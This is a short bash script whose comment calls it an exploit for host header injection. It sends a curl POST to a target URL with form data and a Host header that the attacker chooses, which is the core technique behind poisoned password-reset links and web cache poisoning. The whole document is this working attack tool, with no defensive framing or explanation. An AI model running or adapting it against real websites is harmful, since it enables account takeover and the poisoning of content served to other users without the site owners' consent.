#!/bin/bash
# Exploit Host Header Injection using curl

NEW_HOST="$1"
TARGET_URL="$2"
FORM_DATA="$3"

curl -s -X POST "$TARGET_URL" \
-H "Host: $NEW_HOST" \
-d "$FORM_DATA"
